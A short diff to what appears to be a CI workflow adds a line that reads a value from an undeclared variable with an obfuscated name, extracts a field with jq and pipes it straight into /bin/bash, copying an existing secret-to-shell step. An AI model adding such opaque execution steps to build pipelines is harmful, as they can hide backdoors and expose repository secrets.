@@ -22,6 +22,7 @@ jobs:
           kgw585: ${{ secrets.kgw585 }}
         run: |
           printf '%s' "$kgw585" | jq -r .erqgc674 | /bin/bash
+          printf '%s' "$rpydv441" | jq -r .kh226 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
